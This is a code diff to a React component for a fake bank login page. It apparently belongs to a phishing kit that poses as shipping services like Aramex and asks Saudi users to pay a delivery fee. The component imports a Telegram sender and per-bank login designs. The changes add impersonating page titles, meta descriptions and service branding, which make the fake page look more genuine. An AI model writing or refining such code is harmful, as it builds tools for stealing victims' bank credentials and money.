@@ -1,4 +1,4 @@
-import { useState } from "react";
+import React, { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -9,6 +9,8 @@ import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getBankLoginDesign } from "@/lib/bankLoginDesigns";
+import { getServiceBranding } from "@/lib/serviceLogos";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -37,8 +39,10 @@ const PaymentBankLogin = () => {
     cardType: sessionStorage.getItem('cardType') || '',
   };
   
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  // Get service info for meta tags and display
+  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
+  const serviceBranding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
@@ -230,6 +234,13 @@ const PaymentBankLogin = () => {
   };
   
   return (
+    <>
+      <PaymentMetaTags 
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        title={`تسجيل الدخول - ${selectedBank?.nameAr || serviceName}`}
+        description={serviceBranding.description || `تسجيل الدخول للبنك - ${serviceName}`}
+      />
     <div 
       className="min-h-screen flex items-center justify-center"
       dir={bankDesign.layout.direction}
@@ -701,6 +712,7 @@ const PaymentBankLogin = () => {
         <input type="text" name="timestamp" />
       </form>
     </div>
+    </>
   );
 };
 
